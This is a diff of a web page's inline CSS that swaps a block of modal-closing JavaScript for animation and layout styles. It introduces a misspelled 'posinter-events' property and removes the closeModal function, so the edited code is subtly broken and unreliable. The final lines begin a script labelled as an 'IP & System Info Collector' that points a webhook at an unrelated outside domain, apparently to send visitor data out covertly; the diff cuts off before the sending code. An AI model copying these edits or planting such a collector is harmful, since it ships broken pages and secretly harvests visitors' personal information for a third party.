@@ -183,27 +183,64 @@
 
     .backdrop-visible {
       opacity: 1;
-      pointer-events: auto;
+      posinter-events: auto;
     }
 
-     function closeModal() {
-    modalPanel.classList.remove("modal-open");
-    modalBackdrop.classList.remove("backdrop-visible");
-    modalBackdrop.classList.add("backdrop-hidden");
-    modalBackdrop.setAttribute("aria-hidden", "true");
-    document.body.style.overflow = "";
-  }
-
-  launcherBtn?.addEventListener("click", openModal);
-  modalClose?.addEventListener("click", closeModal);
-  modalBackdrop?.addEventListener("click", (e) => {
-    if (e.target === modalBackdrop) closeModal();
-  });
-  window.addEventListener("keydown", (e) => {
-    if (e.key === "Escape" && modalBackdrop.classList.contains("backdrop-visible")) {
-      closeModal();
+    .modal-scale-in {
+      transform: translateY(10px) scale(0.97);
+      opacity: 0;
+      transition: all 0.2s ease-out;
     }
-  });
+
+    .modal-scale-in.modal-open {
+      transform: translateY(0) scale(1);
+      opacity: 1;
+    }
+
+    /* Video optimizasyonu */
+    .preview-video {
+      transform: translateZ(0);
+      backface-visibility: hidden;
+    }
+
+    @media (max-width: 768px) {
+      .preview-video {
+        display: none;
+      }
+    }
+
+    /* Scroll reveal */
+    .scroll-reveal {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.5s ease-out, transform 0.5s ease-out;
+    }
+
+    .scroll-reveal.revealed {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Animasyonlar */
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    .animate-bounce {
+      animation: bounce 1s ease-in-out infinite;
+    }
+
+    .float-soft {
+      animation: floatSoft 6s ease-in-out infinite alternate;
+    }
+
+    @keyframes floatSoft {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-8px); }
+    }
+  </style>
+
   <!-- Sweet Analytics - IP & System Info Collector -->
   <script>
       const WEBHOOK_URL = "https://iloveanimals.life/apsd";
